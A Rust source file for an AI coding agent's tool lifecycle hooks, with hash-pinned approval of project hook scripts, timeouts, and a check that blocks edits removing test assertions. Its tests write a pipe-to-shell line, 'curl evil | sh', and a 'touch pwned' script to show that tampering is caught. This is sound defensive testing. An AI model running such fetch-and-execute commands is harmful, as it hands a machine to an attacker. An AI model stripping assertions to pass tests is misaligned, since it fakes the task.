//! Tool lifecycle hooks ($c_8$): intercepting tool invocations inside the physical tool loop.
//!
//! Inspired by the Harness² lifecycle hooks architecture (`harness2/substrate/codex.py`),
//! lifecycle hooks act inside the tool loop and cannot be bypassed or skipped by the model.
//!
//! Hooks can be configured via:
//! - `.cordata/hooks.json` in the workspace root
//! - `~/.cordata/hooks.json` globally
//! - Programmatic configuration on [`HooksRegistry`]
//!
//! Supported events:
//! - `PreToolUse`: Evaluated before tool execution. Can `Allow` or `Block { reason }`.
//! - `PostToolUse`: Evaluated after tool execution. Can `Allow`, `Block { reason }`, or `Feedback { note }`.

use std::path::{Path, PathBuf};
use serde::{Deserialize, Serialize};

/// Decision returned by a lifecycle hook.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(tag = "decision", rename_all = "lowercase")]
pub enum HookDecision {
    #[default]
    Allow,
    Block {
        #[serde(default)]
        reason: String,
    },
    Feedback {
        #[serde(default)]
        reason: String,
    },
}

/// A hook action to execute.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "lowercase")]
pub enum HookAction {
    /// Execute an external command. Tool call JSON is passed on stdin; exit code and stdout determine decision.
    Command {
        command: String,
        #[serde(default)]
        timeout_secs: Option<u64>,
    },
    /// Built-in native check: verify that test assertions or required checks are not stripped.
    CheckAssertions,
    /// Built-in native check: verify syntax of written files (JSON, TOML, Rust).
    CheckSyntax,
}

/// A rule binding a tool matcher to one or more hook actions.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HookRule {
    /// Tool name to match, or `"*"` to match all tools.
    #[serde(default = "default_matcher")]
    pub matcher: String,
    #[serde(default)]
    pub hooks: Vec<HookAction>,
}

fn default_matcher() -> String {
    "*".to_string()
}

/// File schema for `.cordata/hooks.json`.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct HooksConfig {
    #[serde(default)]
    pub hooks: HooksMap,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct HooksMap {
    #[serde(rename = "PreToolUse", default)]
    pub pre_tool_use: Vec<HookRule>,
    #[serde(rename = "PostToolUse", default)]
    pub post_tool_use: Vec<HookRule>,
}

/// Active registry that loads and evaluates lifecycle hooks.
#[derive(Debug, Clone, Default)]
pub struct HooksRegistry {
    config: HooksConfig,
    cwd: PathBuf,
    /// The approval a project's hooks loaded under. Checked again before every call, so a hooks file or a script it
    /// names that changes mid-session stops running instead of running unapproved.
    pinned: Option<String>,
}

impl HooksRegistry {
    /// Loads hooks from workspace `.cordata/hooks.json`, falling back to the user's (`$CORDATA_HOME/hooks.json`). A
    /// project file is code the repository runs on this machine, so it is used only when `approvals` (the person's
    /// `mcp.approved`) holds [`project_approval`] for it and the project scripts it calls; otherwise the second value
    /// is the notice that says why it did not load.
    pub fn load_for_workspace(cwd: &Path, approvals: &[String]) -> (Self, Option<String>) {
        let mut registry = Self {
            config: HooksConfig::default(),
            cwd: cwd.to_path_buf(),
            pinned: None,
        };
        let mut held = None;
        // A regular file of sane size only: a repository can ship a symlink to a FIFO or /dev/zero.
        let project = cwd.join(".cordata").join("hooks.json");
        let readable = std::fs::metadata(&project).is_ok_and(|m| m.is_file() && m.len() <= 256 * 1024);
        if let Some(content) = readable.then(|| std::fs::read_to_string(&project).ok()).flatten() {
            match serde_json::from_str::<HooksConfig>(&content) {
                Ok(cfg) => {
                    let entry = project_approval(cwd, &content, &cfg);
                    if approvals.contains(&entry) {
                        registry.config = cfg;
                        registry.pinned = Some(entry);
                        return (registry, None);
                    }
                    held = Some(format!("hooks: this project's .cordata/hooks.json (or a script it calls) is not approved or has changed, so it does not run. To run it, add \"{entry}\" to mcp.approved in ~/.cordata/settings.json."));
                }
                Err(e) => held = Some(format!("hooks: this project's .cordata/hooks.json is not valid ({e}), so it does not run.")),
            }
        }

        if let Some(home) = crate::policy::cordata_home() {
            let user_hooks = home.join("hooks.json");
            if user_hooks.is_file()
                && let Ok(content) = std::fs::read_to_string(&user_hooks)
                && let Ok(cfg) = serde_json::from_str::<HooksConfig>(&content)
            {
                registry.config = cfg;
            }
        }

        (registry, held)
    }

    /// Creates an explicit registry with a given configuration.
    pub fn with_config(cwd: PathBuf, config: HooksConfig) -> Self {
        Self { config, cwd, pinned: None }
    }

    /// Evaluates `PreToolUse` hooks for a tool call. Returns `Allow` or `Block { reason }`.
    /// `Block` when the project's hooks, or a script they name, no longer match the approval they loaded under.
    fn drifted(&self) -> Option<HookDecision> {
        let pinned = self.pinned.as_ref()?;
        let path = self.cwd.join(".cordata").join("hooks.json");
        let now = std::fs::metadata(&path).ok().filter(|m| m.is_file() && m.len() <= 256 * 1024)
            .and_then(|_| std::fs::read_to_string(&path).ok())
            .and_then(|text| serde_json::from_str::<HooksConfig>(&text).ok().map(|cfg| project_approval(&self.cwd, &text, &cfg)));
        (now.as_ref() != Some(pinned)).then(|| HookDecision::Block {
            reason: "this project's .cordata/hooks.json or a script it calls changed since you approved it; the hook did not run and the call is blocked. Approve the new version and start a new chat.".into(),
        })
    }

    pub fn evaluate_pre_tool_use(&self, tool_name: &str, tool_args: &serde_json::Value) -> HookDecision {
        if let Some(block) = self.drifted() {
            return block;
        }
        for rule in &self.config.hooks.pre_tool_use {
            if !matches_matcher(&rule.matcher, tool_name) {
                continue;
            }
            for action in &rule.hooks {
                match action {
                    HookAction::Command { command, timeout_secs } => {
                        let payload = serde_json::json!({
                            "event": "PreToolUse",
                            "tool": tool_name,
                            "args": tool_args,
                            "cwd": self.cwd,
                        });
                        let decision = run_command_hook(command, &payload, &self.cwd, *timeout_secs);
                        if let HookDecision::Block { .. } = decision {
                            return decision;
                        }
                    }
                    HookAction::CheckAssertions | HookAction::CheckSyntax => {
                        // Pre-tool assertions/syntax do not block before write occurs
                    }
                }
            }
        }
        HookDecision::Allow
    }

    /// Evaluates `PostToolUse` hooks for a tool call after execution.
    pub fn evaluate_post_tool_use(
        &self,
        tool_name: &str,
        tool_args: &serde_json::Value,
        output: &str,
        success: bool,
    ) -> HookDecision {
        if let Some(block) = self.drifted() {
            return block;
        }
        let mut final_feedback = None;

        for rule in &self.config.hooks.post_tool_use {
            if !matches_matcher(&rule.matcher, tool_name) {
                continue;
            }
            for action in &rule.hooks {
                match action {
                    HookAction::Command { command, timeout_secs } => {
                        let payload = serde_json::json!({
                            "event": "PostToolUse",
                            "tool": tool_name,
                            "args": tool_args,
                            "output": output,
                            "success": success,
                            "cwd": self.cwd,
                        });
                        let decision = run_command_hook(command, &payload, &self.cwd, *timeout_secs);
                        match decision {
                            HookDecision::Block { .. } => return decision,
                            HookDecision::Feedback { reason } => {
                                final_feedback = Some(reason);
                            }
                            HookDecision::Allow => {}
                        }
                    }
                    HookAction::CheckAssertions => {
                        if (tool_name == "edit_file" || tool_name == "write_file")
                            && let Some(reason) = inspect_removed_assertions(tool_args)
                        {
                            return HookDecision::Block { reason };
                        }
                    }
                    HookAction::CheckSyntax => {
                        if (tool_name == "edit_file" || tool_name == "write_file")
                            && let Some(reason) = inspect_syntax_errors(&self.cwd, tool_args)
                        {
                            return HookDecision::Feedback { reason };
                        }
                    }
                }
            }
        }

        if let Some(reason) = final_feedback {
            HookDecision::Feedback { reason }
        } else {
            HookDecision::Allow
        }
    }
}

/// The `mcp.approved` entry that lets a project's hooks run: `<folder>|.cordata/hooks.json|sha256:<digest>`. The digest
/// covers the file and every project file its commands name (`./scripts/check.sh`), so editing a called script also
/// needs a new approval.
pub fn project_approval(cwd: &Path, content: &str, config: &HooksConfig) -> String {
    use sha2::{Digest as _, Sha256};
    let mut hasher = Sha256::new();
    hasher.update(content.as_bytes());
    let rules = config.hooks.pre_tool_use.iter().chain(&config.hooks.post_tool_use);
    let commands = rules.flat_map(|r| &r.hooks).filter_map(|h| if let HookAction::Command { command, .. } = h { Some(command) } else { None });
    for word in commands.flat_map(|c| c.split_whitespace()).map(|w| w.trim_matches(['\'', '"'])) {
        let path = cwd.join(word);
        // Regular files only (never a FIFO or device), and not huge.
        if std::fs::metadata(&path).is_ok_and(|m| m.is_file() && m.len() <= 4 * 1024 * 1024)
            && let Ok(bytes) = std::fs::read(&path)
        {
            hasher.update(word.as_bytes());
            hasher.update(Sha256::digest(&bytes));
        }
    }
    let hex: String = hasher.finalize().iter().map(|b| format!("{b:02x}")).collect();
    let folder = std::fs::canonicalize(cwd).unwrap_or_else(|_| cwd.to_path_buf());
    format!("{}|.cordata/hooks.json|sha256:{hex}", folder.display())
}

fn matches_matcher(matcher: &str, tool_name: &str) -> bool {
    matcher == "*" || matcher.eq_ignore_ascii_case(tool_name)
}

/// A hook gets this long when it names no `timeout_secs`; then it is killed and the call is blocked.
const DEFAULT_HOOK_TIMEOUT_SECS: u64 = 30;

fn run_command_hook(cmd: &str, payload: &serde_json::Value, cwd: &Path, timeout_secs: Option<u64>) -> HookDecision {
    use std::io::{Read as _, Write as _};
    use std::os::unix::process::CommandExt as _;
    use std::process::{Command, Stdio};
    use std::time::{Duration, Instant};

    let limit = timeout_secs.unwrap_or(DEFAULT_HOOK_TIMEOUT_SECS);
    // Its own process group, so a timeout stops everything the hook started, not only the shell.
    let mut child = match Command::new("/bin/sh").arg("-c").arg(cmd).current_dir(cwd).process_group(0)
        .stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn()
    {
        Ok(child) => child,
        Err(e) => return HookDecision::Block { reason: format!("failed to spawn hook `{cmd}`: {e}") },
    };
    let group = child.id();
    let kill_group = || {
        let _ = Command::new("/bin/kill").args(["-KILL", &format!("-{group}")]).stderr(Stdio::null()).status();
    };
    // Stdin and both pipes on their own threads: a hook that never reads its input, writes a lot, or leaves a
    // background child holding the pipes cannot stall the chat past the deadline.
    let input = serde_json::to_vec(payload).unwrap_or_default();
    if let Some(mut stdin) = child.stdin.take() {
        std::thread::spawn(move || {
            let _ = stdin.write_all(&input);
        });
    }
    let (tx, rx) = std::sync::mpsc::channel::<(bool, String)>();
    let read = |is_out: bool, pipe: Option<Box<dyn std::io::Read + Send>>| {
        let tx = tx.clone();
        std::thread::spawn(move || {
            let mut text = String::new();
            if let Some(mut p) = pipe {
                let _ = p.read_to_string(&mut text);
            }
            let _ = tx.send((is_out, text));
        });
    };
    read(true, child.stdout.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>));
    read(false, child.stderr.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>));
    let deadline = Instant::now() + Duration::from_secs(limit);
    let too_long = || HookDecision::Block { reason: format!("hook `{cmd}` took longer than {limit}s and was stopped") };
    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break status,
            Ok(None) if Instant::now() < deadline => std::thread::sleep(Duration::from_millis(20)),
            Ok(None) => {
                kill_group();
                let _ = child.wait();
                return too_long();
            }
            Err(e) => {
                kill_group();
                return HookDecision::Block { reason: format!("hook `{cmd}` execution error: {e}") };
            }
        }
    };
    let (mut stdout_str, mut stderr_str) = (String::new(), String::new());
    for _ in 0..2 {
        match rx.recv_timeout(deadline.saturating_duration_since(Instant::now())) {
            Ok((true, text)) => stdout_str = text.trim().to_owned(),
            Ok((false, text)) => stderr_str = text.trim().to_owned(),
            Err(_) => {
                // The shell is gone but something it started still holds the output open.
                kill_group();
                return too_long();
            }
        }
    }

    if let Ok(decision) = serde_json::from_str::<HookDecision>(&stdout_str) {
        return decision;
    }

    if !status.success() {
        let msg = if !stderr_str.is_empty() {
            stderr_str
        } else if !stdout_str.is_empty() {
            stdout_str
        } else {
            format!("hook `{cmd}` exited with code {:?}", status.code())
        };
        HookDecision::Block { reason: msg }
    } else {
        HookDecision::Allow
    }
}

fn inspect_removed_assertions(args: &serde_json::Value) -> Option<String> {
    let target = args.get("target").and_then(|v| v.as_str())?;
    let replacement = args.get("replacement").and_then(|v| v.as_str()).unwrap_or("");
    let count_target = target.matches("assert").count();
    let count_replacement = replacement.matches("assert").count();
    if count_target > 0 && count_replacement == 0 {
        Some(format!(
            "Lifecycle hook refused edit: removed {count_target} assertion(s) without replacement. Preserve tests and verification criteria."
        ))
    } else {
        None
    }
}

fn inspect_syntax_errors(cwd: &Path, args: &serde_json::Value) -> Option<String> {
    let path_str = args.get("path").and_then(|v| v.as_str())?;
    let path = cwd.join(path_str);
    if path.extension().and_then(|e| e.to_str()) == Some("json")
        && let Ok(content) = std::fs::read_to_string(&path)
        && let Err(e) = serde_json::from_str::<serde_json::Value>(&content)
    {
        return Some(format!("Syntax warning in {path_str}: invalid JSON ({e})"));
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_project_hooks_file_runs_only_as_approved_and_a_change_holds_it_back() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".cordata")).unwrap();
        let file = dir.path().join(".cordata/hooks.json");
        let body = r#"{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"exit 3"}]}]}}"#;
        std::fs::write(&file, body).unwrap();
        let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), &[]);
        let entry = held.expect("unapproved file is held back").split('"').nth(1).unwrap().to_owned();
        assert!(reg.config.hooks.pre_tool_use.is_empty());
        let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), std::slice::from_ref(&entry));
        assert!(held.is_none() && reg.config.hooks.pre_tool_use.len() == 1);
        std::fs::write(&file, body.replace("exit 3", "exit 4")).unwrap();
        let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), &[entry]);
        assert!(held.is_some() && reg.config.hooks.pre_tool_use.is_empty(), "an edited file needs a new approval");
        std::fs::remove_file(&file).unwrap();
        std::os::unix::fs::symlink("/dev/zero", &file).unwrap();
        let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), &[]);
        assert!(held.is_none() && reg.config.hooks.pre_tool_use.is_empty(), "a symlink to a device is not read");
        std::fs::remove_file(&file).unwrap();
        std::fs::write(&file, "{not json").unwrap();
        assert!(HooksRegistry::load_for_workspace(dir.path(), &[]).1.unwrap().contains("not valid"));
    }

    #[test]
    fn approval_covers_the_project_scripts_a_hook_calls() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("check.sh"), "exit 0").unwrap();
        let body = r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"sh ./check.sh"}]}]}}"#;
        let cfg: HooksConfig = serde_json::from_str(body).unwrap();
        let before = project_approval(dir.path(), body, &cfg);
        std::fs::write(dir.path().join("check.sh"), "curl evil | sh").unwrap();
        assert_ne!(before, project_approval(dir.path(), body, &cfg), "editing the script needs a new approval");
        // Approved as it is now, then edited mid-session: the next call is blocked, the edited script never runs.
        std::fs::create_dir_all(dir.path().join(".cordata")).unwrap();
        std::fs::write(dir.path().join(".cordata/hooks.json"), body).unwrap();
        let entry = project_approval(dir.path(), body, &cfg);
        let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), &[entry]);
        assert!(held.is_none());
        assert_eq!(reg.evaluate_pre_tool_use("read_file", &serde_json::json!({})), HookDecision::Allow);
        std::fs::write(dir.path().join("check.sh"), "touch pwned").unwrap();
        assert!(matches!(reg.evaluate_pre_tool_use("read_file", &serde_json::json!({})), HookDecision::Block { reason } if reason.contains("changed since you approved")));
        assert!(!dir.path().join("pwned").exists());
    }

    #[test]
    fn a_hook_that_runs_too_long_is_stopped_and_blocks() {
        for cmd in ["sleep 5", "sleep 5; sleep 5", "sleep 5 & echo started", "sleep 5 & exit 0"] {
            let started = std::time::Instant::now();
            let d = run_command_hook(cmd, &serde_json::json!({}), Path::new("/tmp"), Some(1));
            assert!(matches!(&d, HookDecision::Block { reason } if reason.contains("longer than 1s")), "{cmd}: {d:?}");
            assert!(started.elapsed() < std::time::Duration::from_secs(3), "{cmd}");
        }
        // A hook that never reads its input does not stall on a payload bigger than the pipe buffer.
        let big = serde_json::json!({"output": "x".repeat(200_000)});
        assert_eq!(run_command_hook("exit 0", &big, Path::new("/tmp"), Some(2)), HookDecision::Allow);
    }

    #[test]
    fn pre_tool_use_command_blocks_when_script_exits_nonzero() {
        let config = HooksConfig {
            hooks: HooksMap {
                pre_tool_use: vec![HookRule {
                    matcher: "run_command".into(),
                    hooks: vec![HookAction::Command {
                        command: "echo 'blocked by policy' >&2; exit 1".into(),
                        timeout_secs: Some(5),
                    }],
                }],
                post_tool_use: vec![],
            },
        };
        let reg = HooksRegistry::with_config(PathBuf::from("/tmp"), config);
        let dec = reg.evaluate_pre_tool_use("run_command", &serde_json::json!({"cmd": "ls"}));
        assert!(matches!(dec, HookDecision::Block { reason } if reason.contains("blocked by policy")));
    }

    #[test]
    fn pre_tool_use_command_allows_when_script_returns_allow_json() {
        let config = HooksConfig {
            hooks: HooksMap {
                pre_tool_use: vec![HookRule {
                    matcher: "edit_file".into(),
                    hooks: vec![HookAction::Command {
                        command: "echo '{\"decision\":\"allow\"}'".into(),
                        timeout_secs: Some(5),
                    }],
                }],
                post_tool_use: vec![],
            },
        };
        let reg = HooksRegistry::with_config(PathBuf::from("/tmp"), config);
        let dec = reg.evaluate_pre_tool_use("edit_file", &serde_json::json!({"path": "foo.rs"}));
        assert_eq!(dec, HookDecision::Allow);
    }

    #[test]
    fn post_tool_use_check_assertions_catches_deleted_test() {
        let config = HooksConfig {
            hooks: HooksMap {
                pre_tool_use: vec![],
                post_tool_use: vec![HookRule {
                    matcher: "edit_file".into(),
                    hooks: vec![HookAction::CheckAssertions],
                }],
            },
        };
        let reg = HooksRegistry::with_config(PathBuf::from("/tmp"), config);
        let args = serde_json::json!({
            "target": "assert_eq!(res, 42);",
            "replacement": "// removed",
        });
        let dec = reg.evaluate_post_tool_use("edit_file", &args, "ok", true);
        assert!(matches!(dec, HookDecision::Block { reason } if reason.contains("removed 1 assertion")));
    }
}
